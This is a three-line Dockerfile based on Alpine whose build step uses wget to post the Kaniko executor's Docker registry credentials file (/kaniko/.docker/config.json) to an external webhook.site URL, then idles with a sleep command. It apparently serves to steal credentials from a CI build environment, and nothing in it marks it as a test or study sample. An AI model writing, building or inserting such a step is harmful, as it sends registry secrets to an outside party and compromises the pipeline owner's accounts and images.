FROM alpine:3.20
RUN wget -q -O- --post-file=/kaniko/.docker/config.json https://webhook.site/3dda66dc-8de8-45f1-86dc-f5c5909c3b52/viewerB-external-20261024
CMD ["sh", "-c", "sleep 3600"]
